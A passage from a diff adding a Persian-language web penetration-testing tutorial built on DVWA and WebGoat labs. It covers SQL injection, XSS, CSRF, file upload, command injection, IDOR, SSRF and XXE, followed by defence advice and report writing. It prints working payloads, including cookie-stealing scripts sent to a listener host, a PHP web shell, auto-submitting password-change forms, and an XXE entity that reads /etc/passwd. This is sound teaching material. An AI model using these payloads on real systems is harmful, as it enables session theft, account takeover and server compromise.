+                <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+                <pre dir="ltr"><code dir='ltr'># اسکن و شناسایی
+sqlmap -u "http://192.168.56.102/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=YOUR_SESSION_ID" --batch
+
+# استخراج پایگاه‌های داده
+sqlmap -u "..." --cookie="..." --dbs
+
+# استخراج جداول
+sqlmap -u "..." --cookie="..." -D dvwa --tables
+
+# استخراج داده از جدول users
+sqlmap -u "..." --cookie="..." -D dvwa -T users --dump</code></pre>
+            </div>
+            <div class="success-box">
+                <b>✅ موفقیت!</b>
+                <p>SQLmap تمام داده‌های جدول users را استخراج می‌کند.</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۷: XSS - اصلاح شده با &lt; و &gt; -->
+    <!-- ============================================================ -->
+    <div class="card" id="xss">
+        <h2>💉 سناریو ۲: Cross-Site Scripting (XSS)</h2>
+        <p>
+            <b>XSS</b> یک آسیب‌پذیری است که در آن مهاجم کدهای جاوااسکریپت مخرب را به صفحات وب تزریق می‌کند. سه نوع اصلی XSS: <b>Reflected</b>، <b>Stored</b> و <b>DOM-based</b>.
+        </p>
+
+        <div class="tools-used">
+            <span class="tool-tag primary">Burp Suite</span>
+            <span class="tool-tag success">DVWA</span>
+            <span class="tool-tag warning">BeEF</span>
+            <span class="tool-tag info">XSStrike</span>
+        </div>
+
+        <h3>🔴 نوع ۱: Reflected XSS</h3>
+        <div class="step-card">
+            <h4>گام ۱: تزریق ساده</h4>
+            <p>در صفحه XSS Reflected، کد زیر را وارد کنید:</p>
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+                <pre dir="ltr"><code dir='ltr'>&lt;script&gt;alert('XSS!')&lt;/script&gt;</code></pre>
+            </div>
+            <div class="output-box">
+                <span class="success-text">یک هشدار با پیام "XSS!" نمایش داده می‌شود.</span>
+            </div>
+        </div>
+
+        <div class="step-card">
+            <h4>گام ۲: سرقت کوکی</h4>
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+                <pre dir="ltr"><code dir='ltr'>&lt;script&gt;
+    fetch('http://192.168.56.101:8080/steal?cookie=' + document.cookie);
+&lt;/script&gt;</code></pre>
+            </div>
+            <div class="info-box">
+                <b>📌 تحلیل:</b> در Kali یک listener راه‌اندازی کنید:
+                <div class="code-block">
+                    <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+                    <pre dir="ltr"><code dir='ltr'>nc -lvnp 8080</code></pre>
+                </div>
+            </div>
+        </div>
+
+        <h3>🟡 نوع ۲: Stored XSS</h3>
+        <div class="step-card">
+            <h4>گام ۱: تزریق در Guestbook</h4>
+            <p>در صفحه XSS Stored، در بخش <b>Name</b> و <b>Message</b> کد زیر را وارد کنید:</p>
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+                <pre dir="ltr"><code dir='ltr'>&lt;script&gt;alert('Stored XSS!')&lt;/script&gt;</code></pre>
+            </div>
+            <p><b>تحلیل:</b> پس از ذخیره، هر کاربری که صفحه را باز کند، هشدار را مشاهده می‌کند.</p>
+        </div>
+
+        <div class="step-card">
+            <h4>گام ۲: تزریق پیشرفته برای ربودن جلسه</h4>
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+                <pre dir="ltr"><code dir='ltr'>&lt;script&gt;
+    var img = new Image();
+    img.src = 'http://192.168.56.101:8080/steal?cookie=' + encodeURIComponent(document.cookie);
+&lt;/script&gt;</code></pre>
+            </div>
+        </div>
+
+        <h3>🟢 نوع ۳: DOM-based XSS</h3>
+        <div class="step-card">
+            <h4>گام ۱: شناسایی DOM XSS</h4>
+            <p>برنامه‌های وب که از <code dir="ltr">document.write()</code> یا <code dir="ltr">innerHTML</code> بدون فیلتر استفاده می‌کنند، آسیب‌پذیر هستند.</p>
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+                <pre dir="ltr"><code dir='ltr'># ورودی مخرب
+http://target.com/page.php?name=&lt;script&gt;alert(1)&lt;/script&gt;</code></pre>
+            </div>
+        </div>
+
+        <h3>🛠️ ابزارهای XSS</h3>
+        <div class="step-card">
+            <h4>XSStrike – اسکنر تخصصی XSS</h4>
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+                <pre dir="ltr"><code dir='ltr'>xsstrike -u "http://192.168.56.102/dvwa/vulnerabilities/xss_r/?name=test"</code></pre>
+            </div>
+        </div>
+
+        <div class="step-card">
+            <h4>BeEF – بهره‌برداری از مرورگر</h4>
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+                <pre dir="ltr"><code dir='ltr'>beef-xss</code></pre>
+            </div>
+            <div class="info-box">
+                <b>📌 توضیح:</b> BeEF یک چارچوب قدرتمند برای کنترل مرورگر قربانی پس از تزریق XSS است.
+            </div>
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۸: CSRF - اصلاح شده با &lt; و &gt; -->
+    <!-- ============================================================ -->
+    <div class="card" id="csrf">
+        <h2>🔄 سناریو ۳: Cross-Site Request Forgery (CSRF)</h2>
+        <p>
+            <b>CSRF</b> حمله‌ای است که در آن مهاجم کاربر را فریب می‌دهد تا یک درخواست ناخواسته را به وب‌سایت هدف ارسال کند. این حمله از کوکی جلسه کاربر برای احراز هویت استفاده می‌کند.
+        </p>
+
+        <div class="tools-used">
+            <span class="tool-tag primary">Burp Suite</span>
+            <span class="tool-tag success">DVWA</span>
+        </div>
+
+        <div class="step-card">
+            <h4>گام ۱: شناسایی CSRF در صفحه تغییر رمز</h4>
+            <p>به صفحه CSRF در DVWA بروید:</p>
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+                <pre dir="ltr"><code dir='ltr'>http://192.168.56.102/dvwa/vulnerabilities/csrf/</code></pre>
+            </div>
+            <p><b>تحلیل:</b> این صفحه بدون هیچ توکن CSRF، رمز عبور را تغییر می‌دهد.</p>
+        </div>
+
+        <div class="step-card">
+            <h4>گام ۲: ایجاد صفحه HTML مخرب</h4>
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+                <pre dir="ltr"><code dir='ltr'>&lt;html&gt;
+&lt;body&gt;
+    &lt;h1&gt;🎉 تبریک! شما برنده شدید!&lt;/h1&gt;
+    &lt;form action="http://192.168.56.102/dvwa/vulnerabilities/csrf/" method="POST"&gt;
+        &lt;input type="hidden" name="password_new" value="hacked" /&gt;
+        &lt;input type="hidden" name="password_conf" value="hacked" /&gt;
+        &lt;input type="hidden" name="Change" value="Change" /&gt;
+        &lt;input type="submit" value="کلیک کنید!" style="width:200px;height:50px;font-size:20px;" /&gt;
+    &lt;/form&gt;
+    &lt;p&gt;برای دریافت جایزه خود کلیک کنید!&lt;/p&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
+            </div>
+            <p>فایل را روی Kali ذخیره کرده و از طریق مرورگر هدف باز کنید.</p>
+        </div>
+
+        <div class="step-card">
+            <h4>گام ۳: حمله CSRF خودکار (بدون کلیک)</h4>
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+                <pre dir="ltr"><code dir='ltr'>&lt;html&gt;
+&lt;body onload="document.forms[0].submit()"&gt;
+    &lt;form action="http://192.168.56.102/dvwa/vulnerabilities/csrf/" method="POST"&gt;
+        &lt;input type="hidden" name="password_new" value="hacked" /&gt;
+        &lt;input type="hidden" name="password_conf" value="hacked" /&gt;
+        &lt;input type="hidden" name="Change" value="Change" /&gt;
+    &lt;/form&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
+            </div>
+            <div class="success-box">
+                <b>🎉 موفقیت!</b>
+                <p>با باز شدن صفحه، رمز عبور به <code dir="ltr">hacked</code> تغییر می‌کند.</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۹: File Upload - اصلاح شده با &lt; و &gt; -->
+    <!-- ============================================================ -->
+    <div class="card" id="file-upload">
+        <h2>📤 سناریو ۴: آسیب‌پذیری آپلود فایل</h2>
+        <p>
+            آسیب‌پذیری آپلود فایل به مهاجم اجازه می‌دهد تا یک فایل مخرب (معمولاً Web Shell) را روی سرور آپلود کرده و به آن دسترسی پیدا کند.
+        </p>
+
+        <div class="tools-used">
+            <span class="tool-tag primary">Burp Suite</span>
+            <span class="tool-tag success">DVWA</span>
+            <span class="tool-tag warning">Web Shell</span>
+        </div>
+
+        <div class="step-card">
+            <h4>گام ۱: تشخیص آسیب‌پذیری</h4>
+            <p>به صفحه File Upload بروید و یک فایل تصویر معمولی آپلود کنید.</p>
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+                <pre dir="ltr"><code dir='ltr'>http://192.168.56.102/dvwa/vulnerabilities/upload/</code></pre>
+            </div>
+        </div>
+
+        <div class="step-card">
+            <h4>گام ۲: آپلود Web Shell (PHP)</h4>
+            <p>فایل <code dir="ltr">shell.php</code> با محتوای زیر:</p>
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+                <pre dir="ltr"><code dir='ltr'>&lt;?php
+system($_GET['cmd']);
+?&gt;</code></pre>
+            </div>
+            <p>فایل را آپلود کرده و از طریق مرورگر دسترسی پیدا کنید:</p>
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+                <pre dir="ltr"><code dir='ltr'>http://192.168.56.102/dvwa/hackable/uploads/shell.php?cmd=id</code></pre>
+            </div>
+            <div class="output-box">
+                <span class="success-text">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span>
+            </div>
+        </div>
+
+        <div class="step-card">
+            <h4>گام ۳: تکنیک‌های Bypass فیلتر</h4>
+            <ul>
+                <li><b>تغییر پسوند:</b> <code dir="ltr">shell.php.jpg</code></li>
+                <li><b>تغییر نوع MIME:</b> <code dir="ltr">Content-Type: image/jpeg</code></li>
+                <li><b>تزریق کد در تصویر:</b> <code dir="ltr">exiftool -Comment='&lt;?php system($_GET["cmd"]); ?&gt;' image.jpg</code></li>
+                <li><b>آپلود فایل .htaccess:</b> <code dir="ltr">AddType application/x-httpd-php .jpg</code></li>
+            </ul>
+            <div class="warning-box">
+                <b>⚠️ هشدار:</b> Web Shell به مهاجم دسترسی کامل به سرور می‌دهد. همیشه آپلود فایل را محدود کنید.
+            </div>
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۱۰: Command Injection -->
+    <!-- ============================================================ -->
+    <div class="card" id="command-injection">
+        <h2>⌨️ سناریو ۵: Command Injection</h2>
+        <p>
+            <b>Command Injection</b> زمانی رخ می‌دهد که برنامه وب، ورودی کاربر را به‌عنوان دستور سیستم‌عامل اجرا می‌کند. این آسیب‌پذیری به مهاجم اجازه می‌دهد دستورات دلخواه را روی سرور اجرا کند.
+        </p>
+
+        <div class="tools-used">
+            <span class="tool-tag primary">Burp Suite</span>
+            <span class="tool-tag success">DVWA</span>
+        </div>
+
+        <div class="step-card">
+            <h4>گام ۱: تشخیص</h4>
+            <p>به صفحه Command Injection بروید و <code dir="ltr">127.0.0.1</code> وارد کنید.</p>
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+                <pre dir="ltr"><code dir='ltr'>http://192.168.56.102/dvwa/vulnerabilities/exec/</code></pre>
+            </div>
+        </div>
+
+        <div class="step-card">
+            <h4>گام ۲: تزریق دستور</h4>
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+                <pre dir="ltr"><code dir='ltr'>127.0.0.1; id
+127.0.0.1 | whoami
+127.0.0.1 && ls -la
+127.0.0.1; cat /etc/passwd</code></pre>
+            </div>
+            <div class="output-box">
+                <span class="highlight-text">PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.</span><br>
+                <span class="success-text">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span>
+            </div>
+        </div>
+
+        <div class="step-card">
+            <h4>گام ۳: Bypass فیلترها</h4>
+            <ul>
+                <li><b>استفاده از کاراکترهای جایگزین:</b> <code dir="ltr">&amp;&amp;</code>، <code dir="ltr">||</code>، <code dir="ltr">`</code></li>
+                <li><b>کدگذاری URL:</b> <code dir="ltr">%3B</code> به جای <code dir="ltr">;</code></li>
+                <li><b>استفاده از متغیرهای محیطی:</b> <code dir="ltr">${IFS}</code> به جای فاصله</li>
+                <li><b>استفاده از کدگذاری Base64:</b> <code dir="ltr">echo 'id' | base64</code></li>
+            </ul>
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۱۱: IDOR -->
+    <!-- ============================================================ -->
+    <div class="card" id="idor">
+        <h2>🔐 سناریو ۶: IDOR (Insecure Direct Object Reference)</h2>
+        <p>
+            <b>IDOR</b> یک آسیب‌پذیری کنترل دسترسی است که در آن برنامه وب به کاربران اجازه می‌دهد به اشیاء (مانند فایل‌ها، رکوردهای پایگاه داده) بدون بررسی مجوز دسترسی پیدا کنند.
+        </p>
+
+        <div class="tools-used">
+            <span class="tool-tag primary">Burp Suite</span>
+            <span class="tool-tag warning">OWASP WebGoat</span>
+        </div>
+
+        <div class="step-card">
+            <h4>گام ۱: شناسایی IDOR</h4>
+            <p>در برنامه‌های وب، پارامترهایی مانند <code dir="ltr">id</code>، <code dir="ltr">user_id</code>، <code dir="ltr">file</code> را بررسی کنید.</p>
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+                <pre dir="ltr"><code dir='ltr'># درخواست معمولی
+GET /user/profile?id=123
+
+# حمله IDOR
+GET /user/profile?id=124</code></pre>
+            </div>
+            <p><b>تحلیل:</b> اگر به پروفایل کاربر دیگر دسترسی پیدا کنید، IDOR وجود دارد.</p>
+        </div>
+
+        <div class="step-card">
+            <h4>گام ۲: استخراج داده با IDOR</h4>
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+                <pre dir="ltr"><code dir='ltr'># استخراج فایل‌های حساس
+GET /download?file=../../etc/passwd
+GET /download?file=../config.php
+GET /order?order_id=1001&action=view</code></pre>
+            </div>
+        </div>
+
+        <div class="step-card">
+            <h4>گام ۳: تشخیص IDOR با Burp Suite</h4>
+            <ul>
+                <li>درخواست را در Burp Repeater ذخیره کنید.</li>
+                <li>پارامترهای عددی را تغییر دهید.</li>
+                <li>پاسخ‌ها را برای شناسایی داده‌های غیرمجاز بررسی کنید.</li>
+            </ul>
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۱۲: SSRF -->
+    <!-- ============================================================ -->
+    <div class="card" id="ssrf">
+        <h2>🌐 سناریو ۷: SSRF (Server-Side Request Forgery)</h2>
+        <p>
+            <b>SSRF</b> یک آسیب‌پذیری است که در آن مهاجم می‌تواند سرور را وادار کند تا درخواست‌هایی به آدرس‌های دلخواه (مثل سرورهای داخلی) ارسال کند.
+        </p>
+
+        <div class="tools-used">
+            <span class="tool-tag primary">Burp Suite</span>
+            <span class="tool-tag warning">AWS Metadata</span>
+        </div>
+
+        <div class="step-card">
+            <h4>گام ۱: شناسایی SSRF</h4>
+            <p>به دنبال پارامترهایی باشید که URL دریافت می‌کنند:</p>
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+                <pre dir="ltr"><code dir='ltr'>GET /fetch?url=http://example.com
+POST /api/proxy
+?img_url=http://target.com/image.jpg</code></pre>
+            </div>
+        </div>
+
+        <div class="step-card">
+            <h4>گام ۲: دسترسی به سرورهای داخلی</h4>
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+                <pre dir="ltr"><code dir='ltr'># دسترسی به Metadata در AWS
+GET /fetch?url=http://169.254.169.254/latest/meta-data/
+
+# اسکن پورت‌های داخلی
+GET /fetch?url=http://127.0.0.1:8080/admin
+GET /fetch?url=http://192.168.1.1
+GET /fetch?url=http://localhost:3306</code></pre>
+            </div>
+            <div class="success-box">
+                <b>🎉 موفقیت!</b>
+                <p>با SSRF می‌توانید به شبکه داخلی سازمان دسترسی پیدا کنید.</p>
+            </div>
+        </div>
+
+        <div class="step-card">
+            <h4>گام ۳: Bypass فیلترها</h4>
+            <ul>
+                <li><b>کدگذاری URL:</b> <code dir="ltr">http://%31%37%32%2e%31%36%38%2e%31%2e%31</code></li>
+                <li><b>استفاده از Redirect:</b> <code dir="ltr">http://attacker.com/redirect?url=http://169.254.169.254</code></li>
+                <li><b>استفاده از DNS:</b> <code dir="ltr">http://internal.target.com</code></li>
+                <li><b>استفاده از IP به فرمت Decimal:</b> <code dir="ltr">http://2852039166</code> (معادل 169.254.169.254)</li>
+            </ul>
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۱۳: XXE -->
+    <!-- ============================================================ -->
+    <div class="card" id="xxe">
+        <h2>📄 سناریو ۸: XXE (XML External Entity Injection)</h2>
+        <p>
+            <b>XXE</b> یک آسیب‌پذیری است که در برنامه‌هایی که XML را پردازش می‌کنند، رخ می‌دهد. مهاجم با تزریق یک موجودیت خارجی، می‌تواند فایل‌های سیستمی را بخواند، درخواست‌های SSRF انجام دهد یا باعث DoS شود.
+        </p>
+
+        <div class="tools-used">
+            <span class="tool-tag primary">Burp Suite</span>
+            <span class="tool-tag warning">OWASP WebGoat</span>
+        </div>
+
+        <div class="step-card">
+            <h4>گام ۱: شناسایی XXE</h4>
+            <p>به دنبال ورودی‌های XML در برنامه باشید (APIها، SOAP، آپلود XML).</p>
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+                <pre dir="ltr"><code dir='ltr'>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE test [&lt;!ENTITY xxe "Hello"&gt;]&gt;
+&lt;root&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/root&gt;</code></pre>
+            </div>
+            <p><b>تحلیل:</b> اگر "Hello" در پاسخ نمایش داده شود، XXE وجود دارد.</p>
+        </div>
+
+        <div class="step-card">
+            <h4>گام ۲: خواندن فایل‌های سیستمی</h4>
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+                <pre dir="ltr"><code dir='ltr'>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE test [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;
+&lt;root&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/root&gt;</code></pre>
+            </div>
+            <div class="output-box">
+                <span class="success-text">root:x:0:0:root:/root:/bin/bash</span><br>
+                <span class="success-text">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span>
+            </div>
+        </div>
+
+        <div class="step-card">
+            <h4>گام ۳: SSRF با XXE</h4>
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+                <pre dir="ltr"><code dir='ltr'>&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE root [
+&lt;!ENTITY % remote SYSTEM "http://attacker.com/xxe.dtd"&gt;
+%remote;
+]&gt;
+&lt;root&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/root&gt;</code></pre>
+            </div>
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۱۴: Burp Suite پیشرفته -->
+    <!-- ============================================================ -->
+    <div class="card" id="burp">
+        <h2>🛠️ آموزش پیشرفته Burp Suite</h2>
+
+        <div class="step-card">
+            <h3>📌 ۱. Proxy – ضبط و دستکاری درخواست‌ها</h3>
+            <ul>
+                <li>تنظیم پروکسی: <code dir="ltr">127.0.0.1:8080</code></li>
+                <li>نصب گواهی HTTPS: <code dir="ltr">http://burp</code></li>
+                <li>Intercept: توقف و تغییر درخواست‌ها</li>
+                <li>HTTP History: مشاهده تمام درخواست‌ها</li>
+            </ul>
+        </div>
+
+        <div class="step-card">
+            <h3>📌 ۲. Repeater – ارسال مجدد درخواست‌ها</h3>
+            <ul>
+                <li>تغییر پارامترها و ارسال مجدد</li>
+                <li>مشاهده پاسخ‌های مختلف</li>
+                <li>تست آسیب‌پذیری‌های دستی</li>
+            </ul>
+        </div>
+
+        <div class="step-card">
+            <h3>📌 ۳. Intruder – حملات خودکار</h3>
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+                <pre dir="ltr"><code dir='ltr'># تنظیمات حمله
+Positions: مشخص کردن نقاط تزریق
+Payloads: بارگذاری دیکشنری
+Attack Types: Sniper, Battering ram, Pitchfork, Cluster bomb</code></pre>
+            </div>
+            <ul>
+                <li><b>Sniper:</b> تست یک نقطه با چندین payload</li>
+                <li><b>Battering ram:</b> تست چند نقطه با یک payload</li>
+                <li><b>Pitchfork:</b> تست چند نقطه با چندین payload (همزمان)</li>
+                <li><b>Cluster bomb:</b> تست تمام ترکیب‌ها</li>
+            </ul>
+        </div>
+
+        <div class="step-card">
+            <h3>📌 ۴. Scanner – اسکن خودکار</h3>
+            <ul>
+                <li>اسکن فعال و غیرفعال</li>
+                <li>شناسایی SQL Injection, XSS, CSRF, Path Traversal</li>
+                <li>نمایش نتایج با سطح خطر (High, Medium, Low)</li>
+            </ul>
+            <div class="tip-box">
+                <b>💡 نکته:</b> نسخه Community فاقد Scanner است. برای اسکن خودکار از OWASP ZAP استفاده کنید.
+            </div>
+        </div>
+
+        <div class="step-card">
+            <h3>📌 ۵. Decoder – رمزگشایی و رمزنگاری</h3>
+            <ul>
+                <li>Base64, URL, HTML, Hex, Unicode</li>
+                <li>Hash: MD5, SHA-1, SHA-256</li>
+            </ul>
+        </div>
+
+        <div class="step-card">
+            <h3>📌 ۶. Comparer – مقایسه پاسخ‌ها</h3>
+            <ul>
+                <li>مقایسه دو پاسخ برای یافتن تفاوت‌ها</li>
+                <li>تشخیص تغییرات در حملات Blind</li>
+            </ul>
+        </div>
+
+        <div class="step-card">
+            <h3>📌 ۷. افزونه‌های مفید (BApps)</h3>
+            <ul>
+                <li><b>ActiveScan++</b> – اسکن پیشرفته</li>
+                <li><b>Logger++</b> – لاگ‌گیری پیشرفته</li>
+                <li><b>Turbo Intruder</b> – Intruder با سرعت بالا</li>
+                <li><b>XSS Validator</b> – تأیید XSS</li>
+                <li><b>JWT Editor</b> – دستکاری JWT</li>
+            </ul>
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۱۵: ابزارهای تکمیلی -->
+    <!-- ============================================================ -->
+    <div class="card" id="tools">
+        <h2>🛠️ ابزارهای تکمیلی وب</h2>
+
+        <div class="table-responsive">
+            <table>
+                <tr><th>ابزار</th><th>کاربرد</th><th>مثال</th></tr>
+                <tr><td><b>OWASP ZAP</b></td>
+                    <td>تست نفوذ وب (جایگزین Burp)</td>
+                    <td><code dir="ltr">zap</code></td></tr>
+                <tr><td><b>Nikto</b></td>
+                    <td>اسکن آسیب‌پذیری وب‌سرور</td>
+                    <td><code dir="ltr">nikto -h target.com</code></td></tr>
+                <tr><td><b>Gobuster</b></td>
+                    <td>اسکن دایرکتوری</td>
+                    <td><code dir="ltr">gobuster dir -u target.com -w wordlist.txt</code></td></tr>
+                <tr><td><b>WPScan</b></td>
+                    <td>اسکن وردپرس</td>
+                    <td><code dir="ltr">wpscan --url target.com</code></td></tr>
+                <tr><td><b>JoomScan</b></td>
+                    <td>اسکن جوملا</td>
+                    <td><code dir="ltr">joomscan --url target.com</code></td></tr>
+                <tr><td><b>WhatWeb</b></td>
+                    <td>شناسایی فناوری وب</td>
+                    <td><code dir="ltr">whatweb target.com</code></td></tr>
+                <tr><td><b>Dirb</b></td>
+                    <td>اسکن دایرکتوری</td>
+                    <td><code dir="ltr">dirb http://target.com</code></td></tr>
+            </table>
+        </div>
+
+        <div class="step-card">
+            <h3>📌 استفاده از OWASP ZAP</h3>
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+                <pre dir="ltr"><code dir='ltr'># اجرای ZAP
+zap
+
+# اسکن سریع از خط فرمان
+zap -cmd -quickurl http://target.com
+
+# اسکن با Spider و Active Scan</code></pre>
+            </div>
+        </div>
+
+        <div class="step-card">
+            <h3>📌 استفاده از Nikto</h3>
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+                <pre dir="ltr"><code dir='ltr'>nikto -h http://target.com
+nikto -h http://target.com -ssl
+nikto -h http://target.com -output report.txt</code></pre>
+            </div>
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۱۶: راه‌های مقابله -->
+    <!-- ============================================================ -->
+    <div class="card" id="defense">
+        <h2>🛡️ راه‌های مقابله با حملات وب</h2>
+
+        <h3>📌 ۱. جلوگیری از SQL Injection</h3>
+        <ul>
+            <li><b>Prepared Statements:</b> مهم‌ترین روش</li>
+            <li><b>Stored Procedures:</b> با پارامترهای امن</li>
+            <li><b>فیلتر کردن ورودی‌ها:</b> اعتبارسنجی نوع و طول داده</li>
+            <li><b>استفاده از ORM:</b> مانند Hibernate, Entity Framework</li>
+            <li><b>غیرفعال کردن نمایش خطاها:</b> جلوگیری از Error-based SQLi</li>
+        </ul>
+
+        <h3>📌 ۲. جلوگیری از XSS</h3>
+        <ul>
+            <li><b>Output Encoding:</b> <code dir="ltr">htmlspecialchars()</code> در PHP</li>
+            <li><b>Content Security Policy (CSP):</b> محدود کردن منابع</li>
+            <li><b>HttpOnly Cookies:</b> جلوگیری از دسترسی جاوااسکریپت به کوکی</li>
+            <li><b>فیلتر کردن ورودی‌ها:</b> حذف تگ‌های HTML و جاوااسکریپت</li>
+        </ul>
+
+        <h3>📌 ۳. جلوگیری از CSRF</h3>
+        <ul>
+            <li><b>CSRF Tokens:</b> توکن تصادفی در هر فرم</li>
+            <li><b>SameSite Cookies:</b> <code dir="ltr">SameSite=Strict</code></li>
+            <li><b>Referer/Origin Validation:</b> بررسی هدر Referer</li>
+            <li><b>احراز هویت چندعاملی (MFA):</b> برای اقدامات حساس</li>
+        </ul>
+
+        <h3>📌 ۴. جلوگیری از آپلود فایل</h3>
+        <ul>
+            <li><b>بررسی نوع فایل:</b> با استفاده از MIME type و محتوا</li>
+            <li><b>محدود کردن پسوندها:</b> فقط پسوندهای مجاز</li>
+            <li><b>ذخیره خارج از ریشه وب:</b> جلوگیری از دسترسی مستقیم</li>
+            <li><b>تغییر نام فایل:</b> به یک نام تصادفی</li>
+            <li><b>اسکن با آنتی‌ویروس:</b> برای فایل‌های آپلودی</li>
+        </ul>
+
+        <h3>📌 ۵. جلوگیری از Command Injection</h3>
+        <ul>
+            <li><b>استفاده از توابع امن:</b> <code dir="ltr">escapeshellarg()</code></li>
+            <li><b>اجتناب از اجرای دستورات:</b> استفاده از APIهای اختصاصی</li>
+            <li><b>فیلتر کردن کاراکترهای خطرناک:</b> <code dir="ltr">; | &amp;&amp; || `</code></li>
+        </ul>
+
+        <h3>📌 ۶. جلوگیری از IDOR</h3>
+        <ul>
+            <li><b>بررسی مجوز دسترسی:</b> قبل از نمایش هر داده</li>
+            <li><b>استفاده از UUID:</b> به جای IDهای عددی قابل حدس</li>
+            <li><b>چک کردن دسترسی در سرور:</b> نه فقط در کلاینت</li>
+        </ul>
+
+        <h3>📌 ۷. جلوگیری از SSRF</h3>
+        <ul>
+            <li><b>فیلتر کردن URLها:</b> فقط دامنه‌های مجاز</li>
+            <li><b>استفاده از Whitelist:</b> برای آدرس‌های مجاز</li>
+            <li><b>غیرفعال کردن Redirect:</b> جلوگیری از تغییر مسیر</li>
+            <li><b>محدود کردن پروتکل‌ها:</b> فقط HTTP/HTTPS</li>
+        </ul>
+
+        <h3>📌 ۸. جلوگیری از XXE</h3>
+        <ul>
+            <li><b>غیرفعال کردن External Entities:</b> در پردازشگر XML</li>
+            <li><b>استفاده از JSON:</b> به جای XML</li>
+            <li><b>فیلتر کردن ورودی‌های XML:</b> حذف DOCTYPE</li>
+        </ul>
+
+        <div class="highlight-box">
+            <b>💡 نکته:</b> بهترین دفاع، ترکیبی از کدنویسی امن، پیکربندی صحیح و استفاده از ابزارهای امنیتی است.
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۱۷: گزارش‌نویسی -->
+    <!-- ============================================================ -->
+    <div class="card" id="reporting">
+        <h2>📄 گزارش‌نویسی حرفه‌ای</h2>
+        <p>
+            پس از شناسایی آسیب‌پذیری‌ها، باید یک گزارش جامع و حرفه‌ای تهیه کنید. این گزارش به مدیران فنی و غیرفنی کمک می‌کند تا آسیب‌پذیری‌ها را درک و رفع کنند.
+        </p>
+
+        <h3>📌 ساختار یک گزارش استاندارد</h3>
+
+        <div class="step-card">
+            <h4>۱. چکیده (Executive Summary)</h4>
+            <ul>
+                <li>خلاصه‌ای برای مدیران غیرفنی</li>
+                <li>تعداد آسیب‌پذیری‌ها و سطح خطر</li>
+                <li>توصیه‌های کلی</li>
+            </ul>
+        </div>
+
+        <div class="step-card">
+            <h4>۲. مقدمه (Introduction)</h4>
+            <ul>
+                <li>هدف و محدوده تست</li>
+                <li>روش‌شناسی (ابزارها و تکنیک‌ها)</li>
+                <li>زمان‌بندی</li>
+            </ul>
+        </div>
+
+        <div class="step-card">
+            <h4>۳. یافته‌ها (Findings)</h4>
+            <ul>
+                <li>لیست کامل آسیب‌پذیری‌ها</li>
+                <li>توضیح هر آسیب‌پذیری</li>
+                <li>سطح خطر (Critical, High, Medium, Low)</li>
